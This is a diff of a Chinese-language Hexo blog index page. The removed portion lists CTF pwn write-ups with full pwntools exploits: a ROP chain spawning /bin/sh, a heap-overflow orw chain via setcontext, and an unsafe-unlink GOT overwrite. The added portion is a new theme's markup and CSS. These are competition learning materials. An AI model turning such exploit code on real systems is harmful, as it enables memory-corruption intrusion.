@@ -1,790 +1,690 @@
-
-
-
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-	<meta charset="UTF-8">
-	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-	<title> [ your blog title ]</title>
-	
-	
-	<!-- stylesheets list from _config.yml -->
-	
-	<link rel="stylesheet" href="/css/PreciousJoy.css">
-	
-	<link rel="stylesheet" href="/css/top-bar.css">
-	
-	<link rel="stylesheet" href="/css/menu-outer.css">
-	
-	<link rel="stylesheet" href="/css/content-outer.css">
-	
-	<link rel="stylesheet" href="/css/bottom-outer.css">
-	
-	<link rel="stylesheet" href="/css/atom-one-dark.css">
-	
-	<link rel="stylesheet" href="/css/recent-posts-item.css">
-	
-	<link rel="stylesheet" href="/css/article-sidebar-toc.css">
-	
-	<link rel="stylesheet" href="/css/jquery.fancybox.min.css">
-	
-	<link rel="stylesheet" href="/css/search.css">
-	
-	<link rel="stylesheet" href="/css/toc.css">
-	
-	<link rel="stylesheet" href="/css/sidebar.css">
-	
-	<link rel="stylesheet" href="/css/archive.css">
-	
-	<link rel="stylesheet" href="/css/jquery.mCustomScrollbar.min.css">
-	
-	<link rel="stylesheet" href="/css/Z-last-cover-others.css">
-	
-	
-	
-<meta name="generator" content="Hexo 6.3.0"></head>
-
-
-
-
-<body id="wrapper">
-
-	<div id="">
-		
-		<div id="top-bar">
-			
-			<div id="avatar-box">
-				<img 
-				class="avatar"
-				src="/images/default-avatar.jpg" 
-				alt="avatar">
-			</div>
-
-			<div id="top-bar-text">
-				<div id="top-bar-title">
-					pa1n
-				</div>
-				<div id="top-bar-slogan">
-					
-				</div>
-			</div>
-
-		</div>
-
-		<div id="menu-outer">
-			<div id="menu-inner">
-				
-				
-				<div class="menu-item">
-					<a href="/">Home</a>
-				</div>
-				
-				<div class="menu-item">
-					<a href="/about">About</a>
-				</div>
-				
-				<div class="menu-item">
-					<a href="/archives">Archives</a>
-				</div>
-				
-
-				<div class="menu-item menu-item-search">
-					
-  <span class="local-search local-search-google local-search-plugin">
-      <input type="search" placeholder="站内搜索" id="local-search-input" class="local-search-input-cls" style="">
-      <div id="local-search-result" class="local-search-result-cls"></div>
-  </span>
-	
-				</div>
-
-			</div>
-		</div>
-
-		<div id="content-outer">
-			<div id="content-inner">
-
-				
-
-<div id="recent-posts-box">
-
+  <meta charset="utf-8">
   
-  <div id="recent-posts">
-    <!-- <h1>Recent Posts</h1> -->
-    
-    
-    <div class="recent-post-item">
-
-      <a href="/2024/05/19/ciscn-pwn/" class="item-title">ciscn_pwn</a>
-      
-      <time datetime="2024-05-19T08:17:29.000Z">
-        2024-05-19
-      </time>
-      
-      <!-- <div class="article-digest"> -->
-        <!-- 第一天_gostack64位的静态编译题
-
-很明显的syscall和很多可以利用的gadget
-
-利用syscall向bss段写入 bin/sh，再syscall执行execve(‘bin/sh’,0,0),拿到flag
-from pwn import*
-from LibcSearcher import *
-p=remote(&quot;8.147.134.47&quot;,16589)
-#p=process(&quot;./gostack&quot;)
-elf=ELF(&#39;./gostack&#39;)
-context.log_level=&quot;debug&quot;
-# Gadgets and syscall addresses
-syscall_address = 0x404043
-rax_ret_address = 0x40f984
-rdi_6_ret_address = 0x4a18a5
-rsi_ret_address = 0x42138a
-rdx_ret_address = 0x4944ec
-
-# Create the payload
-payload = b&#3 -->
-        <!-- </div> -->
-
-        
-        <h2 id="第一天-gostack"><a href="#第一天-gostack" class="headerlink" title="第一天_gostack"></a>第一天_gostack</h2><h5 id="64位的静态编译题"><a href="#64位的静态编译题" class="headerlink" title="64位的静态编译题"></a>64位的静态编译题</h5><p><img src="https://s2.loli.net/2024/05/19/xeACKin2JEw7B8X.png" alt="image-20240519162316093"></p>
-<p><img src="https://s2.loli.net/2024/05/19/5HwmgvtCEARJojT.png" alt="image-20240519162532844"></p>
-<h5 id="很明显的syscall和很多可以利用的gadget"><a href="#很明显的syscall和很多可以利用的gadget" class="headerlink" title="很明显的syscall和很多可以利用的gadget"></a>很明显的syscall和很多可以利用的gadget</h5><p><img src="https://s2.loli.net/2024/05/19/lAQMKgWLYoJOx2n.png" alt="image-20240519162808628"></p>
-<p><img src="https://s2.loli.net/2024/05/19/WIfjVbrg7SMcAPh.png" alt="image-20240519162853532"></p>
-<h5 id="利用syscall向bss段写入-bin-sh，再syscall执行execve-‘bin-sh’-0-0-拿到flag"><a href="#利用syscall向bss段写入-bin-sh，再syscall执行execve-‘bin-sh’-0-0-拿到flag" class="headerlink" title="利用syscall向bss段写入 bin/sh，再syscall执行execve(‘bin/sh’,0,0),拿到flag"></a>利用syscall向bss段写入 bin/sh，再syscall执行execve(‘bin/sh’,0,0),拿到flag</h5><p><img src="https://s2.loli.net/2024/05/19/PIrL94hM2jltmno.png" alt="image-20240519163321686"></p>
-<pre><code class="lang-py">from pwn import*
-from LibcSearcher import *
-p=remote(&quot;8.147.134.47&quot;,16589)
-#p=process(&quot;./gostack&quot;)
-elf=ELF(&#39;./gostack&#39;)
-context.log_level=&quot;debug&quot;
-# Gadgets and syscall addresses
-syscall_address = 0x404043
-rax_ret_address = 0x40f984
-rdi_6_ret_address = 0x4a18a5
-rsi_ret_address = 0x42138a
-rdx_ret_address = 0x4944ec
-
-# Create the payload
-payload = b&#39;a&#39; * 0x100
-payload += p64(elf.bss()) + p64(0x10) + p64(0) * 0x18
-payload += p64(rdi_6_ret_address) + p64(0) * 6
-payload += p64(rsi_ret_address) + p64(elf.bss() + 0x200)
-payload += p64(rdx_ret_address) + p64(0x100)
-payload += p64(rax_ret_address) + p64(0)
-payload += p64(syscall_address)
-payload += p64(rdi_6_ret_address) + p64(elf.bss() + 0x200) + p64(0) * 5
-payload += p64(rdi_6_ret_address) + p64(elf.bss() + 0x200) + p64(0) * 5
-payload += p64(rdi_6_ret_address) + p64(elf.bss() + 0x200) + p64(0) * 5
-payload += p64(rsi_ret_address) + p64(0)
-payload += p64(rdx_ret_address) + p64(0)
-payload += p64(rax_ret_address) + p64(0x3b)
-payload += p64(syscall_address)
-
-# Send the payload
-p.sendlineafter(&#39;message :\n&#39;, payload)
-input()
-p.sendline(&#39;/bin/sh\x00&#39;)
-p.interactive()
-</code></pre>
-<h2 id="EzHeap"><a href="#EzHeap" class="headerlink" title="EzHeap"></a>EzHeap</h2><p><img src="https://s2.loli.net/2024/05/19/tjciLKWbQEsTOF2.png" alt="image-20240519164039631"></p>
-<h5 id="edit函数存在堆溢出"><a href="#edit函数存在堆溢出" class="headerlink" title="edit函数存在堆溢出"></a>edit函数存在堆溢出</h5><p><img src="https://s2.loli.net/2024/05/19/WyVCcLqEt6MK45J.png" alt="image-20240519164143452"></p>
-<h5 id="开启了沙箱保护-这是一道堆的orw。"><a href="#开启了沙箱保护-这是一道堆的orw。" class="headerlink" title="开启了沙箱保护,这是一道堆的orw。"></a>开启了沙箱保护,这是一道堆的orw。</h5><p><img src="https://s2.loli.net/2024/05/19/EVw45MF9RsYUeTp.png" alt="image-20240519164437835"></p>
-<h5 id="泄露出堆的基地址"><a href="#泄露出堆的基地址" class="headerlink" title="泄露出堆的基地址"></a>泄露出堆的基地址</h5><pre><code class="lang-py">add_chunk(0x28)
-add_chunk(0x28)
-
-# Edit and leak heap address
-edit_chunk(0, 0x50, b&#39;a&#39; * 0x50)
-show_chunk(0)
-io.recvuntil(b&#39;a&#39; * 0x50)
-gdb.attach(io)
-pause()
-heap_leak = u64(io.recvuntil(b&#39;Welcome to CISCN 2024!&#39;, drop=True).ljust(8, b&#39;\x00&#39;))
-heap_base = heap_leak &lt;&lt; 12
-</code></pre>
-<p><img src="https://s2.loli.net/2024/05/19/eM7kiyhCDB5rKgT.png" alt="image-20240519165038422"></p>
-<h5 id="将free-hook改成setcontext-通过setcontext控制rsp进而orw-构造rop最后获得flag"><a href="#将free-hook改成setcontext-通过setcontext控制rsp进而orw-构造rop最后获得flag" class="headerlink" title="将free_hook改成setcontext,通过setcontext控制rsp进而orw,构造rop最后获得flag"></a>将free_hook改成setcontext,通过setcontext控制rsp进而orw,构造rop最后获得flag</h5><pre><code class="lang-py">from pwn import *
-
-elf = ELF(&quot;./EzHeap&quot;)
-context.log_level = &#39;debug&#39;
-context.arch = &#39;amd64&#39;
-io=process(&#39;EzHeap&#39;)
-#io = remote(&#39;8.147.129.121&#39;, 26987)
-
-def add_chunk(size, content=b&#39;&#39;):
-    io.sendlineafter(&quot;choice &gt;&gt; &quot;, &#39;1&#39;)
-    io.sendlineafter(&quot;size:&quot;, str(int(size)))
-    io.sendafter(&quot;content:&quot;, content)
-
-def delete_chunk(index):
-    io.sendlineafter(&quot;choice &gt;&gt; &quot;, &#39;2&#39;)
-    io.sendlineafter(&quot;idx:&quot;, str(index))
-
-def edit_chunk(index, size, content):
-    io.sendlineafter(&quot;choice &gt;&gt; &quot;, &#39;3&#39;)
-    io.sendlineafter(&quot;idx:&quot;, str(index))
-    io.sendlineafter(&quot;size:&quot;, str(size))
-    io.sendafter(&quot;content:&quot;, content)
-
-def show_chunk(index):
-    io.sendlineafter(&quot;choice &gt;&gt; &quot;, &#39;4&#39;)
-    io.sendlineafter(&quot;idx:&quot;, str(index))
-
-def exit_program():
-    io.sendlineafter(&quot;choice &gt;&gt; &quot;, &#39;5&#39;)
-
-# Add initial chunks
-add_chunk(0x28)
-add_chunk(0x28)
-
-# Edit and leak heap address
-edit_chunk(0, 0x50, b&#39;a&#39; * 0x50)
-show_chunk(0)
-io.recvuntil(b&#39;a&#39; * 0x50)
-gdb.attach(io)
-pause()
-heap_leak = u64(io.recvuntil(b&#39;Welcome to CISCN 2024!&#39;, drop=True).ljust(8, b&#39;\x00&#39;))
-heap_base = heap_leak &lt;&lt; 12
-
-# Edit chunk to set up fake chunk
-edit_chunk(0, 0x50, b&#39;\x00&#39; * 0x28 + p64(0x21) + b&#39;\x00&#39; * 0x18 + p64(0xd1))
-
-# Leak libc address
-edit_chunk(1, 0x30, b&#39;a&#39; * 0x30)
-show_chunk(1)
-io.recvuntil(b&#39;a&#39; * 0x30)
-libc_leak = u64(io.recvuntil(b&#39;\x7f&#39;)[-6:].ljust(8, b&#39;\x00&#39;))
-libc_base = libc_leak - 0x21ace0
-
-# Edit chunk to consolidate chunks
-edit_chunk(1, 0x30, b&#39;\x00&#39; * 0x28 + p64(0xf1))
-
-# Set up libc addresses
-setcontext_address = libc_base + 0x539e0 + 61
-read_address = libc_base + 0x1147d0
-write_address = libc_base + 0x114870
-rtld_global_address = libc_base + 0x285040
-rtld_3_address = libc_base + 0x2865a0
-
-pop_rdi = libc_base + 0x2a3e5
-pop_rsi = libc_base + 0xe7d0d
-pop_rdx = libc_base + 0x11f2e7  # r12
-ret = libc_base + 0x1193c1
-pop_rax = libc_base + 0x45eb0
-syscall = libc_base + 0x91316
-target_address = ((heap_base + 0x1e30) &gt;&gt; 12) ^ rtld_global_address
-
-# Add chunks to manipulate heap
-add_chunk(0x78)  # Chunk 2
-add_chunk(0x78)  # Chunk 3
-add_chunk(0x78)  # Chunk 4
-add_chunk(0x78)  # Chunk 5
-edit_chunk(5, 0x100, b&#39;a&#39; * 0x78 + p64(0x21) + p64(target_address))
-add_chunk(0x18)  # Chunk 6
-add_chunk(0x18)  # Chunk 7
-add_chunk(0x18)  # Chunk 8
-add_chunk(0x18)  # Chunk 9
-add_chunk(0x18, p64(heap_base + 0x300) + p64(5) + p64(rtld_3_address))
-
-heap_leak_adjusted = heap_base - 0x650
-l_next_address = libc_base + 0x286890
-
-# Create link map
-link_map = p64(0)
-link_map += p64(l_next_address)
-link_map += p64(0)
-link_map += p64(heap_leak_adjusted + 0x940)
-link_map += p64(0) * 28
-link_map += p64(heap_leak_adjusted + 0xa50)
-link_map += p64(heap_leak_adjusted + 0xa70)
-link_map += p64(heap_leak_adjusted + 0xa60)
-link_map += p64(0x10)
-link_map += p64(setcontext_address)
-link_map += p64(ret)
-link_map += p64(0) * 13
-link_map += p64(heap_leak_adjusted + 0x200)
-link_map += b&#39;./flag&#39;.ljust(8, b&#39;\x00&#39;)
-link_map += p64(0)
-link_map += p64(0x100)
-link_map += p64(0) * 2
-link_map += p64(heap_leak_adjusted + 0xc60)
-link_map += p64(ret)
-link_map += p64(0) * 38
-link_map += p64(0x800000000)
-
-# Create ROP chain
-rop_chain = p64(ret) * 0x1
-rop_chain += p64(pop_rdi) + p64(heap_leak_adjusted + 0xaf0)
-rop_chain += p64(pop_rax) + p64(2)
-rop_chain += p64(pop_rsi) + p64(0)
-rop_chain += p64(syscall)
-
-rop_chain += p64(pop_rdi) + p64(3)
-rop_chain += p64(pop_rsi) + p64(heap_leak_adjusted + 0x800)
-rop_chain += p64(pop_rdx) + p64(0x50) + p64(0)
-rop_chain += p64(read_address)
-rop_chain += p64(pop_rdi) + p64(1)
-rop_chain += p64(pop_rsi) + p64(heap_leak_adjusted + 0x800)
-rop_chain += p64(pop_rdx) + p64(0x50) + p64(0)
-rop_chain += p64(write_address)
-
-# Edit chunk with link map and ROP chain
-edit_chunk(0, 0x400, link_map + rop_chain)
-
-# Exit and trigger the payload
-exit_program()
-
-io.interactive()
-</code></pre>
-
-        
-
-
-        <span>
-          <a class="article-read" href="/2024/05/19/ciscn-pwn/"> Read more -->
-          </span>
-        </div>
-
-        
-    
-    <div class="recent-post-item">
-
-      <a href="/2024/05/02/easyshell/" class="item-title">easyshell</a>
-      
-      <time datetime="2024-05-02T14:42:19.000Z">
-        2024-05-02
-      </time>
-      
-      <!-- <div class="article-digest"> -->
-        <!-- from pwn import*
-from LibcSearcher import *
-#p=remote(&quot;node4.buuoj.cn&quot;,)
-p=process(&quot;./babyheap&quot;)
-context.log_level=&quot;debug&quot;
-libc=ELF(&#39;libc.so&#39;)
-elf=ELF(&#39;babyheap&#39;)
-
-p.recvuntil(&#39;captcha is: &#39;)
-cap=p.recv(8)
-p.sendlineafter(&#39;the captcha: &#39;,cap)
-#p.sendlineafter(
-#p.sendlineafter(&#39;Please Select: &#39;,)
-
-
-def add(index,size):
-    p.sendlineafter(&#39;Please Select: &#39;,&#39;1&#39;)
-    p.sendlineafter(&#39;Index: &#39;,str(index))
- -->
-        <!-- </div> -->
-
-        
-        <pre><code>from pwn import*
-from LibcSearcher import *
-#p=remote(&quot;node4.buuoj.cn&quot;,)
-p=process(&quot;./babyheap&quot;)
-context.log_level=&quot;debug&quot;
-libc=ELF(&#39;libc.so&#39;)
-elf=ELF(&#39;babyheap&#39;)
-
-p.recvuntil(&#39;captcha is: &#39;)
-cap=p.recv(8)
-p.sendlineafter(&#39;the captcha: &#39;,cap)
-#p.sendlineafter(
-#p.sendlineafter(&#39;Please Select: &#39;,)
-
-
-def add(index,size):
-    p.sendlineafter(&#39;Please Select: &#39;,&#39;1&#39;)
-    p.sendlineafter(&#39;Index: &#39;,str(index))
-    p.sendlineafter(&#39;Size: &#39;,str(size))
-
-def fill(size,content):
-    p.sendlineafter(&#39;Please Select: &#39;,&#39;3&#39;)
-    p.sendlineafter(&#39;Size: &#39;,str(size))
-    p.sendlineafter(&#39;Content: &#39;,content)
-
-
-gdb.attach(p)
-sleep(1)
-add(20,0x60)
-
-
-p.interactive()
-</code></pre>
-        
-
-
-        <span>
-          <a class="article-read" href="/2024/05/02/easyshell/"> Read more -->
-          </span>
-        </div>
-
-        
-    
-    <div class="recent-post-item">
-
-      <a href="/2024/04/27/heap/" class="item-title">heap</a>
-      
-      <time datetime="2024-04-27T13:35:10.000Z">
-        2024-04-27
-      </time>
-      
-      <!-- <div class="article-digest"> -->
-        <!-- chunk就是一整个
-
- malloc返回的指针指向chunk的数据区域
-free返回的指针指向chunk的header
-pre_size只有在上一个chunk（物理相邻）是释放时才属于下一个chunk的区域，否则属于上一个chunk的
-free_chunk的大小 0x20~0x0x80,malloc(8)得到的是0x20的chunk
-
- -->
-        <!-- </div> -->
-
-        
-        <p>chunk就是一整个</p>
-<p><img src="https://s2.loli.net/2024/05/14/f3vUmEAbwlS7J6j.png" alt="image-20240514230404731"></p>
-<p> malloc返回的指针指向chunk的数据区域</p>
-<p>free返回的指针指向chunk的header</p>
-<p>pre_size只有在上一个chunk（物理相邻）是释放时才属于下一个chunk的区域，否则属于上一个chunk的</p>
-<p>free_chunk的大小 0x20~0x0x80,malloc(8)得到的是0x20的chunk</p>
-<p><img src="https://s2.loli.net/2024/05/14/Y7PbWRAnHrodXKG.png" alt="image-20240514230437610"></p>
-
-        
-
-
-        <span>
-          <a class="article-read" href="/2024/04/27/heap/"> Read more -->
-          </span>
-        </div>
-
-        
-    
-    <div class="recent-post-item">
-
-      <a href="/2024/04/26/note2/" class="item-title">note2</a>
-      
-      <time datetime="2024-04-26T11:00:38.000Z">
-        2024-04-26
-      </time>
-      
-      <!-- <div class="article-digest"> -->
-        <!--  没开偏移的保护
-size是无符号数
-
-进函数后变有符号数，会有溢出
-
-
-
-
-这里只能用字节来填充，b’\x00’都不行
-改了free_got才free的，会执行one_gadget
-用system打会报错，不行
-因为这里有个strncat(dest, (const char *)v7 + 15, 0xFFFFFFFFFFFFFFFFLL);函数，遇到‘\0’或空字符截停
-expfrom pwn import*
-from LibcSearcher import *
-#p=remote(&quot;node5.buuoj.cn&quot;,27431)
-p=process(&quot;./note2&quot;)
-context.log_level=&quot;debug&quot;
-libc=ELF(&#39;./libc-2.23.so&#39;)
-elf=ELF(&#39;./note2&#39;)
-p.sendlineafter(&#39; name:&#39;,&#39;sdf&#39;)
-p.sendlineafter(&#39;address:&#39;,&#39;asdf -->
-        <!-- </div> -->
-
-        
-        <p> 没开偏移的保护</p>
-<p>size是无符号数</p>
-<p><img src="https://s2.loli.net/2024/04/28/tRUaW5Y9BfsNqeI.png" alt="image-20240426213934832"></p>
-<p>进函数后变有符号数，会有溢出</p>
-<p><img src="C:/Users/23633/AppData/Roaming/Typora/typora-user-images/image-20240426214016393.png" alt="image-20240426214016393"></p>
-<p><img src="https://s2.loli.net/2024/04/28/Cj3ytfD9z2euRWx.png" alt="image-20240426190337391"></p>
-<p><img src="https://s2.loli.net/2024/04/28/2mSIchNlVYxzaHZ.png" alt="image-20240426190621665"></p>
-<p><img src="https://s2.loli.net/2024/04/28/qxcdEysoNJZnevh.png" alt="image-20240426190918191"></p>
-<h5 id="这里只能用字节来填充，b’-x00’都不行"><a href="#这里只能用字节来填充，b’-x00’都不行" class="headerlink" title="这里只能用字节来填充，b’\x00’都不行"></a>这里只能用字节来填充，b’\x00’都不行</h5><p><img src="C:/Users/23633/AppData/Roaming/Typora/typora-user-images/image-20240426211910916.png" alt="image-20240426211910916"></p>
-<h5 id="改了free-got才free的，会执行one-gadget"><a href="#改了free-got才free的，会执行one-gadget" class="headerlink" title="改了free_got才free的，会执行one_gadget"></a>改了free_got才free的，会执行one_gadget</h5><p><img src="C:/Users/23633/AppData/Roaming/Typora/typora-user-images/image-20240426213312570.png" alt="image-20240426213312570"></p>
-<h5 id="用system打会报错，不行"><a href="#用system打会报错，不行" class="headerlink" title="用system打会报错，不行"></a>用system打会报错，不行</h5><p><img src="C:/Users/23633/AppData/Roaming/Typora/typora-user-images/image-20240426215822432.png" alt="image-20240426215822432"></p>
-<h5 id="因为这里有个strncat-dest-const-char-v7-15-0xFFFFFFFFFFFFFFFFLL-函数，遇到‘-0’或空字符截停"><a href="#因为这里有个strncat-dest-const-char-v7-15-0xFFFFFFFFFFFFFFFFLL-函数，遇到‘-0’或空字符截停" class="headerlink" title="因为这里有个strncat(dest, (const char *)v7 + 15, 0xFFFFFFFFFFFFFFFFLL);函数，遇到‘\0’或空字符截停"></a>因为这里有个strncat(dest, (const char *)v7 + 15, 0xFFFFFFFFFFFFFFFFLL);函数，遇到‘\0’或空字符截停</h5><p><img src="https://s2.loli.net/2024/04/28/c2k16O4aoGXNPDB.png" alt="image-20240426213647135"></p>
-<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="lang-py">from pwn import*
-from LibcSearcher import *
-#p=remote(&quot;node5.buuoj.cn&quot;,27431)
-p=process(&quot;./note2&quot;)
-context.log_level=&quot;debug&quot;
-libc=ELF(&#39;./libc-2.23.so&#39;)
-elf=ELF(&#39;./note2&#39;)
-p.sendlineafter(&#39; name:&#39;,&#39;sdf&#39;)
-p.sendlineafter(&#39;address:&#39;,&#39;asdf&#39;)
-
-def add(size,content):
-    p.sendlineafter(&#39;option---&gt;&gt;&#39;,&#39;1&#39;)
-    p.sendlineafter(&#39;(less than 128)&#39;,str(size))
-    p.sendlineafter(&#39; content:&#39;,content)
-
-def show(index):
-    p.recvuntil(&quot;&gt;&gt;&quot;)
-    p.sendline(&quot;2&quot;)
-    p.recvuntil(&quot;:&quot;)
-    p.sendline(str(index))
-
-def edit(index, choice, content):
-    p.recvuntil(&quot;&gt;&gt;&quot;)
-    p.sendline(&quot;3&quot;)
-    p.recvuntil(&quot;:&quot;)
-    p.sendline(str(index))
-    p.recvuntil(&quot;]&quot;)
-    p.sendline(str(choice))
-    p.recvuntil(&quot;:&quot;)
-    p.sendline(content)
-
-def free(index):
-    p.recvuntil(&quot;&gt;&gt;&quot;)
-    p.sendline(&quot;4&quot;)
-    p.recvuntil(&quot;:&quot;)
-    p.sendline(str(index))
-&#39;&#39;&#39;
-io.recvuntil(&quot;:&quot;)
-io.sendline(&quot;/bin/sh&quot;) #name
-io.recvuntil(&quot;:&quot;)
-io.sendline(&quot;ddd&quot;)
-&#39;&#39;&#39;
-ptr=0x602120
-fd=ptr-0x18
-bk=ptr-0x10
-
-payload=b&#39;\x00&#39;*8+p64(0xa1)+p64(fd)+p64(bk)
-add(0x80,payload)     #0
-add(0,&#39;sadf&#39;)         #1
-add(0x80,&#39;bin/sh&#39;)    #2
-free(1)
-
-payload=p64(0)*2+p64(0xa0)+p64(0x90)
-add(0,payload)
-
-free(2)
-#b&#39;a&#39;*0x18
-free_got=elf.got[&#39;free&#39;]
-payload=b&#39;a&#39;*0x18+p64(free_got)
-edit(0,1,payload)
-gdb.attach(p)
-sleep(1)
-show(0)
-p.recvuntil(&#39;is &#39;)
-addr=u64(p.recv(6).ljust(8,b&#39;\x00&#39;))
-base=addr-libc.sym[&#39;free&#39;]
-system=base+libc.sym[&#39;system&#39;]
-one=base+0xf02a4
-edit(0,1,p64(system))
-print(hex(addr))
-
-#p.sendline(payload)
-
-p.interactive()
-</code></pre>
-
-        
-
-
-        <span>
-          <a class="article-read" href="/2024/04/26/note2/"> Read more -->
-          </span>
-        </div>
-
-        
-    
-    <div class="recent-post-item">
-
-      <a href="/2024/04/11/ciscn-final-5/" class="item-title">ciscn_final_5</a>
-      
-      <time datetime="2024-04-11T11:36:41.000Z">
-        2024-04-11
-      </time>
-      
-      <!-- <div class="article-digest"> -->
-        <!-- 没开偏移的保护
-地址进行或运算后保存，最后一位存index
-
-
-
-
- -->
-        <!-- </div> -->
-
-        
-        <h5 id="没开偏移的保护"><a href="#没开偏移的保护" class="headerlink" title="没开偏移的保护"></a>没开偏移的保护</h5><p><img src="C:/Users/23633/AppData/Roaming/Typora/typora-user-images/image-20240411193750286.png" alt="image-20240411193750286"></p>
-<p>地址进行或运算后保存，最后一位存index</p>
-<p><img src="C:/Users/23633/AppData/Roaming/Typora/typora-user-images/image-20240411193908492.png" alt="image-20240411193908492"></p>
-<p><img src="C:/Users/23633/AppData/Roaming/Typora/typora-user-images/image-20240411194425445.png" alt="image-20240411194425445"></p>
-<p><img src="C:/Users/23633/AppData/Roaming/Typora/typora-user-images/image-20240411194802328.png" alt="image-20240411194802328"></p>
-<p><img src="C:/Users/23633/AppData/Roaming/Typora/typora-user-images/image-20240411195346375.png" alt="image-20240411195346375"></p>
-
-        
-
-
-        <span>
-          <a class="article-read" href="/2024/04/11/ciscn-final-5/"> Read more -->
-          </span>
-        </div>
-
-        
+  <title>我的技术与生活——小站首页 | lonely is alwals</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="shortcut icon" href="/imgs/shortcut-icon.ico" type="image/x-icon">
+  <link rel="stylesheet" href="/css/public.css" />
+  <link rel="stylesheet" href="/css/layout.css" />
+  <link rel="stylesheet" href="/css/iconfont.css" />
+  <link rel="stylesheet" href="/css/APlayer.min.css" />
+  <script src="/js/APlayer.min.js"></script>
+  <script src="/js/jquery.min.js"></script>
+  <script src="/js/jquery.pjax.min.js"></script>
+
+  <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+  <script>
+    document.title = `我的技术与生活——小站首页`
+  </script>
+<meta name="generator" content="Hexo 6.3.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head>
+
+<style>
+  .load {
+    width: 100%;
+    height: 100vh;
+    background-color: rgb(37, 35, 40);
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    position: relative;
+    z-index: 9999;
+  }
+  .load-circle {
+    width: 80px;
+    height: 80px;
+    border: 8px solid orange;
+    border-bottom-color: transparent;
+    border-radius: 50%;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    animation: rotate 1s linear infinite;
+    filter: drop-shadow(0 0 3px orange);
+  }
+  .load-circle-inner {
+    width: 40px;
+    height: 40px;
+    border: 8px solid orange;
+    border-top-color: transparent;
+    border-radius: 50%;
+    animation: rotate-reverse .5s linear infinite;
+  }
+  .load-text {
+    margin-top: 20px;
+    font-size: 24px;
+    color: orange;
+    display: flex;
+  }
+  .load-text span {
+    margin: 0 5px;
+    text-shadow: 5px 5px 5px orange;
+    animation: move 1s linear infinite;
+  }
+  .load-text span:nth-child(1) {
+    animation-delay: -0.6s;
+  }
+  .load-text span:nth-child(2) {
+    animation-delay: -0.5s;
+  }
+  .load-text span:nth-child(3) {
+    animation-delay: -0.4s;
+  }
+  .load-text span:nth-child(4) {
+    animation-delay: -0.3s;
+  }
+  .load-text span:nth-child(5) {
+    animation-delay: -0.2s;
+  }
+  .load-text span:nth-child(6) {
+    animation-delay: -0.1s;
+  }
+  @keyframes rotate {
+    0% { transform: rotate(0); }
+    100% { transform: rotate(360deg); }
+  }
+  @keyframes rotate-reverse {
+    0% { transform: rotate(0); }
+    100% { transform: rotate(-360deg); }
+  }
+  @keyframes move {
+    0% { transform: translateY(0%) rotate(0) scale(1); }
+    20% { transform: translateY(20%) rotate(10deg) scale(1.2); }
+    80% { transform: translateY(-10%) rotate(-20deg) scale(.8);}
+    100% { transform: translateY(0) rotate(0) scale(1); }
+  }
+
+  .progress {
+    position: fixed;
+    left: 0; top: 0;
+    width: 0;
+    height: 3px;
+    background-color: green;
+    transition: all cubic-bezier(0.215, 0.610, 0.355, 1) .1s;
+    z-index: 9999;
+  }
+
+  .to-up {
+    animation: toUp .5s 1;
+  }
+  .gray {
+    position: fixed;
+    left: 0;
+    top: 0;
+    width: 100%;
+    height: 100vh;
+    z-index: 9999;
+    display: none;
+    pointer-events: none;
+    background-color: #000;
+    mix-blend-mode: color;
+  }
+  @keyframes toUp {
+    from { transform: translateY(15px); opacity: 0; }
+    to { transform: translateY(0) ; opacity: 1; }
+  }
+</style>
+<body>
+  <div id="load" class="load">
+    <div class="load-circle">
+      <div class="load-circle-inner"></div>
+    </div>
+    <p class="load-text">
+      <span>L</span>
+      <span>O</span>
+      <span>A</span>
+      <span>D</span>
+      <span>I</span>
+      <span>N</span>
+      <span>G</span>
+    </p>
+  </div>
+  <div id="container" class="container w-100 vh-100" style="display: none;">
+    <header class="header">
+  <div class="header-wrapper">
+    <div class="header-left">
+      <div class="header-search">
+        <input id="search-input" type="text" class="header-search--input" placeholder="请输入要检索的文章标题" />
+        <span id="search-btn" class="header-search--icon"><i class="iconfont icon-sousuo"></i></span>
       </div>
-      
-
-
-      <div id="recent-posts-paginator">
-        <a class="extend prev" rel="prev" href="/page/3/"> </a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><span class="space">&hellip;</span><a class="page-number" href="/page/11/">11</a><a class="extend next" rel="next" href="/page/5/"> </a>
+      <div id="search-layer" class="header-search--layer hidden">
+        <p class="title">
+          <span>以下是搜索内容：</span>
+          <span id="close-layer-btn">关闭</span>
+        </p>
+        <ul>
+        </ul>
       </div>
-
     </div>
-
-<aside id="sidebar">
-  
-  <div class="widget-box">
-  	  <div class="widget-box">
-    <h3 class="widget-title-friends">friends</h3>
-    <div class="widget">
-      
-        <a class="friends-list-link" style="display: block;" href="https://fireworks99.github.io/" title target='_blank'
-        >fireworks99</a>
-      
-    </div>
-  </div>
-
-  </div>
-  
-  <div class="widget-box">
-  	
-
-  </div>
-  
-  <div class="widget-box">
-  	
-  <div class="widget-box">
-    <h3 class="widget-title-tag">tags</h3>
-    <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/buu/" rel="tag">buu</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf-NewSar/" rel="tag">ctf-NewSar</a></li></ul>
-    </div>
-  </div>
-
-
-  </div>
-  
-  <div class="widget-box">
-  	
-  <div class="widget-box">
-    <h3 class="widget-title-archive">archives</h3>
-    <div class="widget">
